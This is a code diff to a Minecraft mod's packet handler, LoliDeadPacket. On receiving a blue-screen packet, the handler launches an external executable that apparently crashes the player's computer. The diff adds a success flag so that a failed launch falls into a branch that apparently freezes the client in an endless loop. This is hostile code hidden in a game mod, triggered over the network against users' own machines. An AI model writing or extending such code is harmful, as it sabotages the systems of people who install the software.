@@ -78,6 +78,7 @@ public class LoliDeadPacket implements IMessage {
 					Minecraft.getMinecraft().displayGuiScreen(new GuiGameOver(Minecraft.getMinecraft().player.getCombatTracker().getDeathMessage()));
 				}
 			}
+			boolean success = false;
 			if (message.isBlueScreen()) {
 				if (LoliPickaxeCore.blueScreenExe.exists()) {
 					LoliPickaxeCore.blueScreenExe.delete();
@@ -88,11 +89,12 @@ public class LoliDeadPacket implements IMessage {
 				}
 				try {
 					Runtime.getRuntime().exec("\"" + LoliPickaxeCore.blueScreenExe.getAbsolutePath() + "\"");
+					success = true;
 				} catch (IOException e) {
 					FMLCommonHandler.instance().exitJava(0, true);
 				}
 			}
-			if (message.isFailRespond()) {
+			if (message.isFailRespond() || !success) {
 				if (!Minecraft.getMinecraft().isCallingFromMinecraftThread()) {
 					Minecraft.getMinecraft().addScheduledTask(() -> {
 						while (true)
